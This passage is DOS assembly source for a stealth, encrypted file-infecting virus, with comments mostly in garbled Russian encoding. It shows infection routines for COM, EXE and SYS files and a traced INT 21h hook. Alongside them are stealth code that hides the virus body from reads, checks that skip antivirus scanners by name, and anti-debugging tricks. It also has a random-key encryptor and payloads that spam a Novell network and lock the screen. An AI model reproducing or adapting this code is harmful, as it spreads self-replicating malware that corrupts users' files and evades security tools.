           jc      disfail             ; ®è¨¡ª ? ã â®£¤  ¯à¨ § ¯¨á¨ â®£®,
           xor     cx,ax               ; ç¥£® ¯à®áïâ ®è¨¡ª  ¡ã¤¥â â®¦¥!
           jnz     disfail

           mov     cx,-1               ; ¤¢¨£ ¥¬áï ª  ç «ã â¥«  ¢¨àãá 
           mov     dx,-vsize           ; ¨«¨ ª®æã § à ¦¥®© ¯à®£à ¬¬ë
           call    seekfrom_eof
           mov     ah,40h              ; ª áâà¨àã¥¬ ä ©« (ã¤ «ï¥¬ â¥«® ¢¨àãá 
           xor     cx,cx               ; ¨§ ¢¨àãá®®á¨â¥«ï
           call    int21
           mov     ah,68h              ; ¯¨è¥¬ ¢á¥ ¤ ë¥   ¤¨áª
           call    int21
    disfail:
           call    restoreseek         ; ¢®ááâ  ¢«¨¢ ¥¬ lseek
           pop     ds                  ; ¢®ááâ  ¢«¨¢ ¥¬ à¥£¨áâàë
           popa
    nowrite:
           jmp     exithandler         ; ¢ëå®¤¨¬

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; Ah=18h,AL=0DDh: TSR test
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    tsrtest:
           cmp     al,0ddh
           jne     tsrexit
           mov     ax,0303h
           jmp     ireturn

    tsrexit:
           jmp     exithandler

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ> SúUúBúRúOúUúTúIúNúEúS <ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¯®¤¯à®£à ¬¬  ¤«ï ¯à®¢¥àª¨ ä ©«  (bx=handle)   § à ¦¥®áâì
   ; cf=1 ¥á«¨ § à ¦¥
    inf?:
          pusha                    ; á®åà ¨âì ¢ áâ¥ª¥ à¥£¨áâàë
          push    ds es
          push    cs cs
          pop     ds es

          call    seeksave         ; á®åà ï¥¬ ¯®§¨æ¨î lseek
          mov     cx,-1            ; ¤¢¨£ ¥¬áï ª  ç «ã ¯®¤¯à®£à ¬¬ë "extra"
          mov     dx,-(eov-extra)  ; (¯® ¥© ¡ã¤¥¬ á¢¥àïâì)
          call    seekfrom_eof

          mov     ah,3fh           ; ç¨â ¥¬ ¯®¤¯à®£à ¬¬ã ¢ "buffer"
          mov     cx,(eov-extra)
          lea     dx,buffer
          call    int21
          call    restoreseek      ; ¢®ááâ ®¢¨âì ¯®§¨æ¨î lseek
          xor     cx,ax            ; ¢á¥ ¯à®ç¨â «®áì?
          jnz     not_infected

          lea     si,buffer
          lea     di,extra
          mov     cx,eov-extra
          cld
          repe     cmpsb
          jne      not_infected

    infected:
          stc
          pop     es ds
          popa
          ret

    not_infected:
          clc
          jmp      infected+1

   ; ¯®¤¯à®£à ¬¬  ¤«ï ¢ëª ¯ë¢ ¨ï ®à¨£¨ «ì®£®  ç «  § à ¦¥®© ¯à®£à ¬¬ë
   ;   ¢å®¤¥: bx - handler
   ;   ¢ëå®¤¥: "buffer" á ®à¨£¨ «ìë¬ à áè¨äà®¢ ë¬  ç «®¬
   ; á®åà ï¥â ¯®§¨æ¨î lseek ¢ ä ©«¥

    load_original:
           pushall                 ; save all 16-bit registers (exc. SP)
           push    cs cs
           pop     ds es

           xor     cx,cx           ; remember the current lseek position
           xor     dx,dx
           call    seekfrom_cur
           push    ax dx

           mov     cx,-1            ; seek to the virus start (-vsize bytes
           mov     dx,-vsize        ; from end of file)
           call    seekfrom_eof     ;
           mov     ah,3fh           ; read virus body to the buffer
           mov     cx,vsize
           lea     dx,buffer
           call    int21

           pop     cx dx            ; ¢®ááâ  ¢«¨¢ ¥¬ ¯®§¨æ¨î lseek ¢
           call    seekfrom_bof     ; § à ¦¥®© ¯à®£à ¬¬¥

           mov     byte ptr [buffer+(cr_ret-ksenia)],0cbh
           lea     ax,buffer
           cwd
           mov     cx,16
           div     cx
           mov     cx,cs
           add     ax,cx
           add     dx,crypt-ksenia
           push    cs offset retc
           push    ax dx
           retf

    retc:
           lea     si,[buffer+(original-ksenia)]
           lea     di,buffer
           mov     cx,28
           cld
           rep     movsb

           popall
           ret

   ; •¨àãà£¨ç¥áª ï ®¡à ¡®âª  ¯à¥àë¢ ¨ï int 21h
    cr21z:
          pusha                    ; á®åà ¨âì à¥£¨áâàë
          push    ds es
          push    cs cs
          pop     ds es

          in      al,40h
          sub     al,70h
          jnc     $-2
          add     al,80h+70h
          mov     splint,al

          mov     ah,25h
          lea     dx,tsr
          int     21h

          cmp     word ptr original,0ffffh
          jz      my_int
          mov     ax,1600h
          int     2fh
          or      al,al
          jz      no_win

    my_int:
          mov     ax,3521h
          int     21h
          mov     win21,bx
          mov     win21+2,es
          mov     ax,2521h
          lea     dx,win_trick
          int     21h
          jmp     motherfucker

    no_win:
          mov     si,30h*4         ;  ©â¨ ®à¨£¨ «ìë© ¢¥ªâ®à ¯à¥àë¢ ¨ï
    nextchain:                     ; int 21h
          cmp     byte ptr [si],0eah       ; ¯àï¬®© ¤ «ì¨© ¤¦ ¬¯?
          jne     another_way
          lds     si,[si+1]                ; § £àã§¨âì ¢ ds:si ááë«ªã ¤¦ ¬¯ 
          cmp     word ptr [si],9090h      ; â ¬  å®¤ïâáï 2 nop' ?
          jnz     nextchain
          sub     si,32h                   ;   ¥á«¨ ¢§ïâì ¯®à ìè¥?
          cmp     word ptr [si],9090h      ; nop/nop
          je      gotreal                  ; call far [....]

    another_way:
          cmp     word ptr [si],2e1eh      ; push ds
          jne     motherfucker             ; cs:[...]?
          add     si,25h                   ;   ¤ «ìè¥?
          cmp     word ptr [si],80fah      ; cli
          je      gotreal                  ; cmp ah,[..]

    motherfucker:                  ; ç¥ â® ¬¥ï ¯®¥á«®...
          push    0
          pop     ds
          lds     si,ds:[84h]      ; « ¤®, åã© á ¨¬
    gotreal:
          mov     cs:io21,si       ; § á®¢ë¢ ¥¬ ç¥  è«¨ ¢ ïç¥©ªã ¯ ¬ïâ¨
          mov     cs:io21+2,ds
          mov     ax,ds:[si]       ; ç¨â ¥¬ 2 ¯¥à¢ë¥ ¡ ©â  ®¡à ¡®âç¨ª 
          mov     cs:prev2,ax      ; á®åà ï¥¬ ¨å

          push    cs
          pop     ds
          mov     ax,3501h
          int     21h
          mov     io1,bx
          mov     io1+2,es
          mov     ax,2501h
          lea     dx,trace
          int     21h

          pushf                    ; á®åà ¨âì ¢ áâ¥ª¥  ¤à¥á
          push    cs               ; ¢®§¢à â 
          push    offset trace_post

          pushf                    ; á®åà ¨âì ¢ áâ¥ª¥ ä« £¨ á®
          pop     ax               ; ¢ª«îç¥ë¬ ¡¨â®¬ âà áá¨à®¢ª¨
          or      ah,1
          push    ax
          push    dword ptr io21     ; ¨ § £àã§¨âì  ¤à¥á 21-£® ®¡à ¡®âç¨ª 
          mov     ah,30h             ; ¥¢¨ ï äãªæ¨ï dos
          iret                       ; ¯¥à¥©â¨ ¢ à¥¦¨¬ âà áá¨à®¢ª¨

    trace_post:
          pop     es ds            ; §¤¥áï ¬ë ª®ç¨«¨...........
          popa
          ret

    trace:
          push    eax bp ds        ; âà áá¨à®¢ª  21-£®

          mov     ax,cs:io21       ; ¢§ïâì á¬¥é¥¨¥
          inc     ax
          mov     bp,sp
          cmp     [bp+8],ax        ; ¢ë¯®«¨«¨áì «¨ ¯¥à¢ë¥
          je      nextcmd          ; ¤¢  ¡ ©â  ®¡à ¡®âç¨ª ?

          and     word ptr [bp+12],0feffh  ; ã¡à âì ä« £ âà áá¨à®¢ª¨
          mov     eax,[bp+8]               ; áç¨â âì  ¤à¥á á«¥¤ãîé¥© ¨áâàãªæ¨¨
          mov     dword ptr cs:_addr21,eax
          push    0                        ; ds=0
          pop     ds
          push    dword ptr cs:io1         ; ¢®ááâ ®¢¨âì 1-© ¢¥ªâ®à
          pop     dword ptr ds:[4]

    nextcmd:
          pop     ds bp eax       ; ¢ëå®¤ ¨§ ¯à¥àë¢ ¨ï
          iret                    ; âà áá¨à®¢ª¨

    ; Verifyes MCB owner
    verifymcb:
           pusha
           push    ds es

           mov     ah,62h          ; get current psp segment
           call    int21
           dec     bx              ; get mcb segment
           mov     ds,bx
           mov     si,08h          ; name of the owner
           lea     di,stdisable
    cmpchar:
           mov     al,[si]         ; get char of the owner name
           call    upreg
           cmp     al,cs:[di]
           jne     nextname
           or      al,al
           jz      the_same
           inc     si
           inc     di
           cmp     si,10h
           je      the_same
           jmp     cmpchar
     nextname:
           inc     di
           cmp     byte ptr cs:[di],0
           jne     nextname
           inc     di
           cmp     byte ptr cs:[di],0ffh
           je      the_different
           mov     si,08h
           jmp     cmpchar
    the_same:
           mov     cs:stf,1
           jmp     quitvmcb
    the_different:
           mov     cs:stf,0
    quitvmcb:
           pop     es ds
           popa
           ret
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; sys infection ÄÄ called by infect, [di] = buffer
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    sysinfect:
           cmp     word ptr [di],0ffffh
           jne     cierr
           call    seek2eof
           or      dx,dx
           jnz     cierr
           cmp     ax,65035-vsize
           ja      cierr
           mov     word ptr [di+8],ax
           add     ax,(strategy-ksenia)
           xchg    word ptr [di+6],ax
           mov     word ptr old_strategy,ax
           clc
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; com infection ÄÄ called by infect, [di] = buffer
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    cominfect:
           cmp     word ptr [di],0ffffh
           je      cierr
           mov     al,0e9h
           stosb
           call    seek2eof
           or      dx,dx
           jnz     cierr
           cmp     ax,65035-vsize
           ja      cierr
           sub     ax,3
           stosw
           clc
           ret
    cierr: stc
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; exe infection ÄÄ called by infect, [di] = buffer
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    exeinfect:
           cmp     byte ptr [di+18h],'@'   ; NExe?
           je      exerr

           mov     ax,512                  ; get file size from header
           mov     cx,word ptr [di+4]
           cmp     word ptr [di+2],0
           jz      $+3
           dec     cx
           mul     cx
           add     ax,word ptr [di+2]
           adc     dx,0
           xchg    ax,si
           xchg    dx,di

           call    seek2eof                ; and the real size
           cmp     ax,si                   ; compare its
           jne     exerr
           cmp     dx,di
           jne     exerr

           push    ax dx                   ; get location in exe file
           mov     cx,16
           div     cx
           sub     ax,word ptr buffer+8
           mov     word ptr buffer+14h,dx
           mov     word ptr buffer+16h,ax
           inc     ax                      ; special for TBAV
           mov     word ptr buffer+0eh,ax
           mov     word ptr buffer+10h,3000h
           pop     dx ax

           add     ax,vsize                ; get pages/lst page lenght
           adc     dx,0
           mov     cx,512
           div     cx
           or      dx,dx
           jz      $+3
           inc     ax
           mov     word ptr buffer+2,dx
           mov     word ptr buffer+4,ax
           clc
           ret

    exerr: stc
           ret


   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ’¥áâ¨àã¥â ä ©«   ¯à¥¤¬¥â ¥§ à ¦ ¥¬®áâ¨ + ¢¨¤®ãá ¨§¢à â
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    filenamecheck:         pusha                  ; á®åà ¨âì à¥£¨áâàë
                           mov     si,dx          ; si=dx
                           dec     si             ; dec+inc=0
    findend:               inc     si             ;  ©â¨ ª®¥æ
                           cmp     byte ptr [si],0
                           jne     findend

    findname:              dec     si             ; decrease si
                           cmp     byte ptr [si],'\'
                           je      gotname
                           cmp     byte ptr [si],':'
                           je      gotname
                           cmp     si,dx
                           jae     findname
    gotname:               inc     si              ; si=filename
                           mov     ax,[si]         ; get first chars
                           call    upreg
                           cmp     ax,'IW'         ; Windows?
                           je      winfound

    otherfiles:            cmp     ax,'IF'         ; FindVirus?
                           je      badfile
                           cmp     ax,'CS'         ; Scan?
                           je      badfile
                           cmp     ax,'SV'         ; VSafe/VShield?
                           je      badfile
                           cmp     ax,'BT'         ; Fucked TBSCAN?
                           je      badfile
                           cmp     ax,'RD'         ; DRWEB?
                           je      badfile
                           cmp     ax,'VA'         ; AVP?
                           je      badfile
                           cmp     ax,'-F'         ; F-PROT?
                           je      badfile
                           cmp     ax,'PF'         ; FPROT?
                           je      badfile
                           cmp     ax,'DA'         ; ADInf?
                           je      badfile
                           cmp     ax,'OC'         ; COMMAND interpreter?
                           je      badfile

                           clc                     ; filename is okay
                           popa
                           ret

    badfile:               stc                     ; bad file...
                           popa
                           ret

    winfound:              cmp     cs:func_number,4b00h   ; windows: EXECUTE?
                           jne     otherfiles
                           mov     ax,[si+2]              ; get second two chars
                           call    upreg                  ; uppercase
                           cmp     ax,'.N'                ; wiN.?
                           jne     otherfiles
                           mov     ax,[si+4]       ; get third two chars
                           call    upreg
                           cmp     ax,'OC'         ; win.CO?
                           jne     otherfiles

                           push    ds es           ; widows executing:
                           mov     si,es:[bx+2]    ; offset of command line
                           mov     ax,es:[bx+4]    ; get segment =es=ds
                           mov     ds,ax
                           mov     es,ax
                           mov     di,si           ; ds:si=es:di=comline
                           inc     di
                           cld
                           cmp     byte ptr [si],0 ; no parameters entered?
                           je      writeparam
                           mov     al,0dh          ; search for the cr(lf)
                           mov     cx,127
                           repne   scasb
                           jne     noparam         ; error?
                           dec     di
    writeparam:            mov     cx,6
                           add     byte ptr [si],5 ; increase lenght of
                           push    cs              ; the command line
                           pop     ds
                           lea     si,wino32bit
                           rep     movsb           ; write new params...
    noparam:               pop     es ds
                           clc                     ; exit, file is okay!
                           popa
                           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; Checks the handle (Disk file?)
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    handlecheck:           pusha
                           mov     ax,4400h
                           call    int21
                           jc      hcerr
                           test    dl,80h
                           jnz     hcerr
                           clc
                           popa
                           ret

    hcerr:                 stc
                           popa
                           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; subroutine to decrease number of read bytes and remove lseek from virus zone
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    seekhide:              call    seek2eof
                           sub     ax,vsize
                           sbb     dx,0

                           cmp     dx,cs:seek_pos+2
                           jb      hidevirus
                           ja      not_us
                           cmp     ax,cs:seek_pos
                           jae     not_us

    hidevirus:             push    ax
                           sub     cs:seek_pos,ax
                           mov     ax,cs:seek_pos
                           sub     cs:nrbytes,ax  ; subtract number of read bytes
                           pop     ax
                           mov     cs:seek_pos,ax
                           mov     cs:seek_pos+2,dx

    not_us:                call    restoreseek
                           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; lseek tools
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    seeksave:              pusha
                           xor     cx,cx
                           xor     dx,dx
                           call    seekfrom_cur
                           mov     cs:seek_pos,ax
                           mov     cs:seek_pos+2,dx
                           popa
                           ret

    restoreseek:           pusha
                           mov     dx,cs:seek_pos
                           mov     cx,cs:seek_pos+2
                           call    seekfrom_bof
                           popa
                           ret

    seek2bof:              mov     ax,4200h
                           xor     cx,cx
                           mov     dx,cx
                           jmp     realseek

    seek2eof:              mov     ax,4202h
                           xor     cx,cx
                           xor     dx,dx
                           jmp     realseek

    seekfrom_eof:          mov     ax,4202h
                           jmp     realseek

    seekfrom_cur:          mov     ax,4201h
                           jmp     realseek

    seekfrom_bof:          mov     ax,4200h

    realseek:              call    int21
                           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; Upper case AX
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    upreg:                 cmp     al,61h
                           jb      goodchar
                           cmp     al,7ah
                           ja      goodchar
                           sub     al,20h
    goodchar:              cmp     ah,61h
                           jb      _good_
                           cmp     ah,7ah
                           ja      _good_
                           sub     ah,20h
    _good_:                ret

   ; ððððððððððððððððððððððððððððððððððððððððððððððððððððððððððððððððððððððððððð
   ; ððððððððððððððððððððð ‚áïª ï åã©ï ¤«ï Novell Network ððððððððððððððððððððð
   ; ððððððððððððððððððððððððððððððððððððððððððððððððððððððððððððððððððððððððððð
    novell:                pushall

                           mov     ax,7a00h        ; Novell installation check
                           int     2fh
                           or      al,al
                           jz      no_novell

                           mov     ax,2ah          ; Š®â®àë© ç á? (¤¥ì..)
                           call    int21
                           cmp     al,1            ; *®¥¤¥«ì¨ª?
                           jne     no_novell

                           mov     ah,2ch          ; 5 ¬¨ãâ -£®?
                           call    int21
                           cmp     cl,5
                           jne     no_send

                           push    cs cs
                           pop     ds es
                           cld
                           in      al,40h          ; á«ãç ©®¥ ç¨á«®
                           and     al,111b         ; [0..7]
                           mov     word ptr buffer,9eh
                           mov     byte ptr buffer+2,0 ; ¯®á« âì á®®¡é¥¨¥
                           mov     byte ptr buffer+3,1 ; 1 connection
                           mov     byte ptr buffer+4,al ; connection #
                           mov     byte ptr buffer+5,endnmess-nmess ; ¤«¨  ¬¥áá £¨
                           lea     si,nmess
                           lea     di,buffer+6
                           mov     cx,endnmess-nmess
                           rep     movsb

                           mov     ah,0e1h         ; ®â¯à ¢¨âì ä ª
                           lea     si,buffer
                           lea     si,two_bytes
                           call    int21

                           mov     cx,60
                           lea     di,buffer+4
    fake_down:             mov     byte ptr [di],10
                           inc     di
                           loop    fake_down
                           mov     word ptr buffer,3eh
                           mov     byte ptr buffer+2,9
                           mov     byte ptr buffer+3,3ch ; ¤«¨  á®®¡é¥¨ï
                           lea     si,buffer
                           lea     di,two_bytes
                           mov     ah,0e1h
                           call    int21
                           jmp     no_novell

    no_send:               cmp     ch,17
                           jne     no_novell
                           mov     ah,0d7h
                           call    int21

    no_novell:             popall
                           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; § ¯¨áì § è¨äà®¢ ®£® â¥«  ¢¨àãá  ¢ ä ©«
   ; á ¬®¥ £« ¢®¥ ¢ íâ®¬ ¢¨àãá¥ (¯®áâ ¢ìâ¥ âãâ  ret ¨ ¢á¥ ª ¥(¨)¡¥¨ ¬ â¥à¨)
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
     writevirus:
           mov     ax,5700h                ; § ¯à®á ¢à¥¬¥¨/¤ âë ¯®á«¥¤¥£®
           call    int21                   ; ¬®¤¨ä¨æ¨à®¢ ¨ï ä ©« 
           push    dx cx                   ; á®åà ¨âì ¢ áâ¥ª¥

           mov     ah,2ch                  ; § ¯à®á â¥ªãé¥£® ¢à¥¬¥¨
           call    int21                   ; ¢ dx:cx
           pop     ax                      ; ¢®ááâ ®¢¨âì ¢ ax ¨ á®åà ¨âì á®¢ 
           push    ax                      ; ¢à¥¬ï
           shr     ah,3                    ; ¡¥à¥¬ ç áë (¡¨âë 11-15 ¢ cx)
           cmp     ah,ch                   ; á®¢¯ ¤ îâ? ¥á«¨ ¤ , â® áêï¡ë¢ ¥¬áï,
           je      write_fail              ; çâ®¡ë ¥ § á¢¥â¨âìáï

           call    seek2eof                ;   ¨ ç¥ ¨¤¥¬ ¢ ª®¥æ ä ©« 
           mov     ah,40h                  ; § ¯¨áë¢ ¥¬áï ¢ ä ©«
           mov     cx,vsize
           cwd
           call    crypt_int21_crypt       ; á ç «  § è¨äàã¥¬áï
           xor     cx,ax                   ; ¢á¥ vsize ¡ ©â § ¯¨á «¨áì?
           jnz     write_fail
           call    seek2bof                ; ¨¤¥¬ ¢  ç «®
           mov     ah,40h                  ; § ¯¨áë¢ ¥¬ ¢¨¤®¨§¬¥¥ë©
           mov     cx,28                   ; § £®«®¢®ª com/exe ä ©« 
           lea     dx,buffer
           call    int21
     write_fail:
           pop     cx dx                   ; ¢ëãâì ¤ âã ¨ ¢à¥¬ï ä ©« 
           mov     ax,5701h                ; ãáâ ®¢¨âì ¥¥ ®¡à â®
           call    int21
           ret

    MEM_ENC_END:

    ; Ž¡à ¡®âç¨ª ¯à¥àë¢ ¨ï int 09h
    int9:  pusha                    ; á®åà ¨âì ¨á¯®«ì§ã¥¬ë¥ à¥£¨áâàë
           push    ds cs            ; ds=cs
           pop     ds

           in      al,60h                 ; ç¨â âì áª -ª®¤
           cmp     al,80h                 ; ª« ¢¨èã ®â¯ãáâ¨«¨?
           jb      quit_9                 ; ¥â: ¢ëå®¤¨¬
           mov     si,point               ; ¨ ç¥ áç¨â ¥¬ â¥ªãé¨© ãª § â¥«ì
           cmp     [si],al                ; á«¥¤ãîé ï ¡ãª¢  ¯®¤å®¤¨â?
           jne     zero_pointer           ; ¥â: ®¡ã«¨âì ãª § â¥«ì ¨ ¢ë©â¨
           inc     si                     ; ¯®¤å®¤¨â. ¨ªà¥¬¥â¨à®¢ âì ãª § â¥«ì
           cmp     si,offset keyword+6    ; ¢á¥ 6 ¡ãª¢ ¡ë«¨  ¦ âë?
           jb      save_it                ; ¥â: á®åà ¨âì íâ® § ç¥¨¥

           mov     al,0ffh
           out     21h,al

           mov     ax,3
           int     10h

           push    cs
           pop     es
           lea     bp,smb_pattern
           mov     dx,'1'
    modify_keygen:
           mov     cx,1
           mov     ax,1100h
           mov     bx,0e00h
           int     10h
           add     bp,0eh
           inc     dx
           cmp     dx,'6'
           jne     modify_keygen

           mov     ah,1
           mov     ch,100000b
           int     10h

           mov     ax,0b800h
           mov     es,ax
           xor     si,si
           xor     di,di
           mov     cx,endcopy-copy

    Im_here:
           mov     al,cs:copy+si
           mov     ah,0ah
           mov     es:[di],ax
           inc     si
           inc     di
           inc     di
           loop    Im_here
           jmp     $

    zero_pointer:
           lea     si,keyword      ; ®¡ã«ï¥¬ ãª § â¥«ì
    save_it:
           mov     point,si        ;   âãâ  á®åà ï¥¬ ¥£®
    quit_9:
           pop     ds              ; ¢®ááâ  ¢«¨¢ ¥¬ ¢áïª®¥ ¤¥àì¬®
           popa
           jmp     dword ptr cs:io9

   ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
    ireturn:
           call    restorehost             ; re-á¯« ©á¨£
           pop     word ptr cs:buffer      ; garbage
           pop     word ptr cs:buffer
           pop     word ptr cs:buffer
           retf    2

   ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
    exithandler:
           push    si ds ax                ; á®åà ¨âì à¥£¨áâàë
           lds     si,dword ptr cs:_addr21 ; áç¨â âì  ¤à¥á
           mov     ah,cs:splint
           mov     al,0cdh
           xchg    ax,[si]
           mov     cs:keepword,ax
           pop     ax ds si
           mov     cs:resthost,1

           push    bp
           mov     bp,sp
           sub     word ptr [bp+2],2       ; ®âª®àà¥ªâ¨à®¢ âì â®çªã
           pop     bp                      ; ¢®§¢à â 
           iret                            ; finita la comedia
                                           ; (¢à®¤¥ â ª)

   ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
    restorehost:
           push    ds si ax                ; á®åà ¨âì à¥£¨áâàë
           lds     si,dword ptr cs:io21    ; ¤ âì  ¤à¥á ®¡à ¡®âç¨ª 
           mov     ah,cs:splint
           mov     al,0cdh
           mov     [si],ax                 ; á®áâ®á¨âì ¢ë§®¢ there
           pop     ax si ds                ; ¢®áá¨â ®¢¨âì à¥£¨áâàë
           ret

           db      4 dup (?)

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; *®¤¯à®£à ¬¬  § /à §-è¨äà®¢ª¨ ç áâ¨ ¢¨àãá 
   ; ˆá¯®«ì§ã¥â XOR/ADD/SUB/NOT/INC/DEC/ROR/ROL/NEG è¨äà®¢é¨ª¨
   ; ‘«ãç ©ë© ª«îç
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    crypt:
           pushf                           ; á®åà ¨âì ¨á¯®«ì§ã¥¬ë¥ à¥£¨áâàë
           pusha
           push    ds

    foolsr:                                ;  ¥¡ª  ¤«ï ¤¨§ áá¥¬¡«¥à 
           mov     ax,01ebh                ; ¯¥à¥ªàë¢ îé¨©áï ª®¤
           mov     bx,02ebh
           nop
           mov     cx,3ebh
           nop
           nop
           mov     dx,4ebh
           nop
           nop
           nop
           mov     ax,2ebh
           jmp     foolsr+1

           call    extra                   ; ¢ëç¨á«¨âì íªáâà -á¬¥é¥¨¥

           push    0                       ;  ¥¡ª  í¢à¨áâ¨ª 
           pop     ds
           mov     si,21h*4                ; ¡ã¤â® terminate,   ¥é¥ ¨  â¨¤*¡ £
           push    dword ptr [si]
           lea     ax,fool_antiv+bp
           push    cs ax
           pop     dword ptr [si]
           mov     ah,0b4h
           int     21h
    cc?:   cmp     dx,0fa01h
           je      $+30h

    fool_antiv:
           pop     ax bx dx
           pop     dword ptr [si]
           cmp     byte ptr cs:cc?+bp,0cch
           jne     bug

           int     19h

    bug:
           db      0b0h                    ; à áè¨äà®¢ë¢ ¥¬ £« ¢ë©
    pre_ki db      000h                    ; ¬¥å ¨§¬
           lea     si,crmain+bp
           mov     cx,endcr-crmain
    de_cr: xor     cs:[si],al              ; ¯à®áâë¬ ªá®à®¬
           inc     si
           loop    de_cr

    crmain:                                ; £« ¢ë© ¬¥å ¨§¬
           jmp     overtable

    algorithm dw   9090h                   ;  «£®à¨â¬
    crtable label  word                    ; â ¡«¨æ  § è¨äà®¢é¨ª®¢
           xor     dl,cl
           add     dl,cl
           sub     dl,cl
           not     dl
           inc     dl
           dec     dl
           ror     dl,cl
           rol     dl,cl
           neg     dl

    decrtable label word                   ; â ¡«¨æ  à áè¨äà®¢é¨ª®¢
           xor     dl,cl
           sub     dl,cl
           add     dl,cl
           not     dl
           dec     dl
           inc     dl
           rol     dl,cl
           ror     dl,cl
           neg     dl

    overtable:
           db      0ebh,decrypt-overtable-2

           in      al,40h                  ; ¯®«ãç¨âì á«ãç ©®¥ ç¨á«®
           sub     al,9
           jnc     $-2
           add     al,9
           cbw
           add     ax,ax
           mov     si,ax

           mov     ax,cs:[crtable+si+bp]   ; ¢§ïâì § è¨äà®¢é¨ª
           mov     cs:[algorithm+bp],ax
           in      al,40h
           mov     cs:[value+bp],al
           mov     bx,si

    decrypt:
           mov     ax,cs:algorithm+bp
           mov     si,208h
           push    dword ptr [si]
           mov     word ptr [si],ax
           mov     byte ptr [si+2],0cbh
           xor     byte ptr cs:overtable+bp+1,decrypt-overtable-2

           lea     si,enc_start+bp          ; ¨¨æ¨ «¨§ æ¨ï
           mov     cx,crypt-enc_start
           db      0b0h
    value  db      ?

    decrvirus:
           mov     dl,byte ptr cs:[si]     ;  ª®¥æ-â®!!!
           xor     al,cl
           xchg    al,cl
           db      09ah
           dw      208h,0
           xchg    al,cl
           mov     byte ptr cs:[si],dl
           inc     si
           loop    decrvirus
           pop     dword ptr ds:[208h]

